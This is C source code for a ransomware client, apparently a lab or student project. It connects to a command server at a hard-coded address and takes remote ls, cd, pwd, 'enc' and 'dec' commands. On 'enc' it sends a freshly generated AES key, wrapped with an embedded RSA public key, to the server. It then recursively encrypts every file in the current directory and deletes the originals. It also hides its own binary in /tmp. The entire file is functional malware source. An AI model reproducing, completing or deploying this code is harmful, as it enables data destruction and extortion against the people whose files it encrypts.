#include "ransomlib.h"
#include <dirent.h>
#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>
#include <openssl/rand.h>
#include <stdio.h>
#include <errno.h>
#include <openssl/pem.h>
#include <openssl/ssl.h>
#include <openssl/rsa.h>
#include <openssl/evp.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <string.h>

char publicKey[] = "-----BEGIN PUBLIC KEY-----\n"\
"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuaSs3J+sdyTWIGiYOuWe\n"\
"PVjbJoI42eUzHrJpAuVhwaHsVREKdFSYG4LP7SdFLtAQxSDQYBqwe5gLfJk/E89j\n"\
"cWnhDL5Kqnz4ihyfyk31zJxEdzjxccs7LTiXY5IuFPsOpxZJjf5xPIopqjiBcbxi\n"\
"+/+jTWfG5xT8gh8PbqpRnVi5/qQqD/4tXkCXeNsJ4yJSFOymhmTieclXkDakPzQJ\n"\
"2jLnBUA0pEeDBoeVMKLsib+FPdC6BN/hVT4n56xvln7J1tbtMM/ujT1mH/KKndgA\n"\
"xqd8R5PZRhudSQGNg6UrhmlsmS1OUdmB+/9eOHVGeLeIZHNcHyc9n5OQ+W7CpZ0p\n"\
"+wIDAQAB\n"\
"-----END PUBLIC KEY-----\n";

int padding = RSA_PKCS1_PADDING;



void handleError(int sockid);

RSA * createRSA(unsigned char * key, int public); //Create RSA structure used for encryption and decryption

int public_encrypt(unsigned char * data, int data_len, unsigned char * key, unsigned char *encrypted);

int is_encrypted(char *filename);

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag);

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);

int send_key(char *pKey, char *pIv, int sockid, struct sockaddr_in server_addr);

int main (int argc, char * argv[])
{
    int sockid;
    int server_port = 8888;
    char *server_ip = "10.0.0.2";

    sockid = socket(AF_INET, SOCK_STREAM,0);
    if (sockid <0)
    {
        printf("Error when creating socket\n");
        handleError(sockid);
    }

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);

    struct sockaddr_in client_addr;
    client_addr.sin_family = AF_INET;
    client_addr.sin_port = htons(5555);
    client_addr.sin_addr.s_addr = inet_addr("10.0.0.1");

    if (bind(sockid, (struct sockaddr *)&client_addr, sizeof(client_addr))<0)
    {
        printf("Error during binding\n");
        printf("%s\n", strerror(errno));
        handleError(sockid);
        
    }
    if (connect(sockid, (struct sockaddr *)&server_addr, sizeof(server_addr))!=0)
    {
        printf("Error during connection\n");
        handleError(sockid);
    }

    system("/bin/mv ex /tmp/ex");
	
    while(1) 
    {
        int status;
        char command[512];
        status = recv(sockid, command, 512, 0);
        if (status<=0)
        {
            printf("Connection shutdown\n");
            handleError(sockid);
        }
        

        if(strncmp(command,"ls",2 ) == 0)   //Handle ls command
        {
            FILE *out_fp;
            char buffer[1048];
            char path[100000];
            int  bytes;

            out_fp = popen("/bin/ls", "r");

            fgets(buffer, sizeof(buffer), out_fp);      //put in path the result of ls command line by line
            strcpy(path, buffer);

            while (fgets(buffer, sizeof(buffer), out_fp) != NULL)
            {
                strcat(path, buffer);
            }
            bytes =send(sockid, (const char *)path, strlen(path)+1,0); //send the whole result once
            
        }
        else if(strncmp(command,"enc",3) ==0)   //Handle enc command
        {
            char cwd[1048];
            getcwd(cwd, 1024);

            unsigned char key[33];
            int sizeKey = 33;
            unsigned char iv[33];
            int sizeIv = 33;
            char pKey[65];
            char pIv[65];
	        int status = generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);

            send_key(pKey, pIv, sockid, server_addr);
            listdir((const char *)cwd, iv, key, 'e');
            memset(key, 0, 33);
            memset(iv, 0, 33);
            memset(pKey, 0, 65);
            memset(pIv, 0, 65);
        }
        else if (strncmp(command, "dec",3)==0)
        {
            char cwd[1048];
            getcwd(cwd, 1024);
            unsigned char key[33];
            int size;
            unsigned char iv[33];
            char pKey[65];
            char pIv[65];
            const char * separator = " ";

            char * strToken = strtok(command, separator);
            strToken = strtok(NULL, separator);
            strcpy(pKey, strToken);
            strToken = strtok(NULL, separator);
            strcpy(pIv, strToken);
            size = strlen(pIv);
            printf("%s\n", key);
            printf("%s\n", iv);
            pIv[size-1] = '\0';  //removing \n from the iv
            hexa_to_bytes(pKey, key,33);
            hexa_to_bytes(pIv, iv,33);
            char response[2048];
            strcpy(response, cwd);
            strcat(response, " ");
            strcat(response, "Decrypted\n");

            printf("%s\n", key);
            printf("%s\n", iv);
            printf("%s\n", pKey);
            printf("%s\n", pIv);

            listdir((const char *)cwd, (unsigned char *)iv, (unsigned char *)key, 'd');
            send(sockid, (const char *)response, strlen(response)+1,0);
            memset(key, 0, 33);
            memset(iv, 0, 33);
            memset(pKey, 0, 65);
            memset(pIv, 0, 65);



        }
        else if (strncmp(command,"pwd",3) ==0)
        {
            char cwd[1048];
            int bytes;
            getcwd(cwd, 1048);
            bytes = send(sockid, (const char *)cwd, strlen(cwd)+1,0);

        }
        else if(strncmp(command,"cd", 2) ==0)
        {
            char cwd[1048];
            int status;
            int size;
            char *error;
            char buff[1048];
            const char * separator = " ";
            char * strToken = strtok(command, separator); //spliting array in two array in order to get the path
            strToken = strtok(NULL, separator);
            strcpy(buff, strToken);
            size = strlen(buff);
           
            buff[size-1] ='\0'; //removing \n from the path
            status = chdir(buff);
            if (status !=0 )
            {
                error = strerror(errno);
                send(sockid, (const char *)error, strlen(error)+1,0);
            }
            else 
            {
                getcwd(cwd, 1024);
                send(sockid, (const char *)cwd, strlen(cwd)+1,0);
                
            }
            
        }
        

    }
	
}

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv)
{
	RAND_priv_bytes(key, sizeKey);
	RAND_priv_bytes(iv, sizeIv);
	bytes_to_hexa(key, pKey,sizeKey );
	bytes_to_hexa(iv, pIv, sizeKey);
}

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag)
{
	DIR *dp = opendir(name);
	struct dirent *dirp;

	while((dirp = readdir(dp)) != NULL)
    {
        if(dirp->d_type==DT_DIR && strcmp("..",dirp->d_name) != 0 && strcmp(".",dirp->d_name) != 0 )
        {
            
            char *newPath = (char*)malloc(strlen(name)+strlen(dirp->d_name)+2);
            strcpy(newPath,name);
            strncat(newPath,"/",2);
            strncat(newPath,dirp->d_name,strlen(dirp->d_name));
            if (de_flag == 'e')
            {
                listdir(newPath,iv, key, 'e');
            }
            else
            {
                listdir(newPath,iv, key, 'd');
            }
            free(newPath);
        }

        else if(strcmp("..",dirp->d_name) != 0 && strcmp(".",dirp->d_name) != 0)
        {
            char *filePath = (char*)malloc(strlen(name)+strlen(dirp->d_name)+2);
            strcpy(filePath,name);
            strncat(filePath,"/",2);
            strncat(filePath,dirp->d_name,strlen(dirp->d_name));
            printf("%s\n",filePath);
            if (de_flag == 'e' && is_encrypted(filePath) == 0)
            {
                encrypt(key, iv, filePath);
                remove(filePath);
            }
            else if (de_flag == 'd' && is_encrypted(filePath) == 1)
            {
                decrypt(key, iv, filePath);
                remove(filePath);
            }
            free(filePath);
        }
    }
}

int public_encrypt(unsigned char * data,int data_len,unsigned char * key, unsigned char *encrypted)
{
    RSA * rsa = createRSA(key,1);
    int result = RSA_public_encrypt(data_len,data,encrypted,rsa,padding);
    return result;
}
int send_key(char *pKey, char *pIv, int sockid, struct sockaddr_in server_addr)
{
    unsigned char  encrypted[4098]={};
    char *msg = malloc(strlen(pKey)+strlen(pIv)+2);  // Format du message key:Iv
    strcpy(msg, pKey);
    strcat(msg,":");
    strcat(msg,pIv);
    printf("%s\n", msg);
    public_encrypt(msg, strlen(msg), publicKey, encrypted);
    send(sockid, (const char *)encrypted, 257,0);
    free(msg);
}

int is_encrypted(char *filename)
{
    int size = strlen(filename);
    if (filename[size-1] == 'd' && filename[size-2]=='n' && filename[size-3] == 'w' && filename[size-4] == 'P' && filename[size-5] == '.')
    {
        return 1;
    }
    else 
    {
        return 0;
    }


}        

void handleError(int sockid)
{
    close(sockid);
    system("/bin/mv /tmp/ex $HOME/ex");
    abort();

}
RSA * createRSA(unsigned char * key,int public)
{
    RSA *rsa= NULL;
    BIO *keybio ;
    keybio = BIO_new_mem_buf(key, -1);
    if (keybio==NULL)
    {
        printf( "Failed to create key BIO");
        return 0;
    }
    if(public)
    {
        rsa = PEM_read_bio_RSA_PUBKEY(keybio, &rsa,NULL, NULL);
    }
    else
    {
        rsa = PEM_read_bio_RSAPrivateKey(keybio, &rsa,NULL, NULL);
    }
    if(rsa == NULL)
    {
        printf( "Failed to create RSA");
    }
 
    return rsa;
}
